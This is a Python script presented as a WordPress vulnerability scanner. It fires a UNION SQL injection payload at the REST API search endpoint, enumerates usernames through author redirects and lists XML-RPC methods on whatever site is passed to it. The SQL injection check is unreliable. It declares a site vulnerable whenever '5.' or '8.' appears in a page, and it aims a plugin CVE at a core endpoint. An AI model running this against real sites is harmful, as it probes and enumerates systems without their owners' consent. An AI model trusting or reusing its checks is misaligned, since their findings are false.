#!/usr/bin/env python3
"""
WordPress Vulnerability Scanner
Tests for multiple CVEs
"""
import requests
import sys
from urllib.parse import urljoin

class WordPressScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def check_cve_2024_27956(self):
        """Check for CVE-2024-27956 SQL Injection"""
        print("[*] Checking CVE-2024-27956 (SQL Injection)...")
        
        payload = "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,@@version,24-- -"
        
        try:
            response = self.session.get(
                f"{self.target}/wp-json/wp/v2/posts",
                params={'search': payload},
                timeout=10,
                verify=False
            )
            
            if '5.' in response.text or '8.' in response.text:  # MySQL version
                self.vulnerabilities.append('CVE-2024-27956')
                print("[+] VULNERABLE: CVE-2024-27956")
                return True
        except:
            pass
        
        print("[-] Not vulnerable to CVE-2024-27956")
        return False
    
    def check_user_enumeration(self):
        """Check for user enumeration vulnerability"""
        print("[*] Checking user enumeration...")
        
        for i in range(1, 10):
            try:
                response = self.session.get(
                    f"{self.target}/?author={i}",
                    allow_redirects=False,
                    timeout=5,
                    verify=False
                )
                
                if response.status_code in [301, 302] and 'author' in response.headers.get('Location', ''):
                    username = response.headers['Location'].split('/')[-1]
                    print(f"[+] User enumerated: {username}")
                    return True
            except:
                continue
        
        print("[-] No user enumeration detected")
        return False
    
    def check_xmlrpc(self):
        """Check for XML-RPC vulnerabilities"""
        print("[*] Checking XML-RPC...")
        
        try:
            response = self.session.post(
                f"{self.target}/xmlrpc.php",
                data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                headers={'Content-Type': 'text/xml'},
                timeout=5,
                verify=False
            )
            
            if 'methodName' in response.text:
                print("[+] XML-RPC is enabled (potential attack vector)")
                return True
        except:
            pass
        
        print("[-] XML-RPC not accessible")
        return False
    
    def scan(self):
        """Run all scans"""
        print(f"[*] Scanning {self.target} for WordPress vulnerabilities...")
        
        self.check_cve_2024_27956()
        self.check_user_enumeration()
        self.check_xmlrpc()
        
        if self.vulnerabilities:
            print(f"\n[!] Found {len(self.vulnerabilities)} potential vulnerabilities:")
            for vuln in self.vulnerabilities:
                print(f"    - {vuln}")
        else:
            print("\n[-] No obvious vulnerabilities detected")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 wp-scanner.py http://wordpress-site.com")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = WordPressScanner(target)
    scanner.scan()
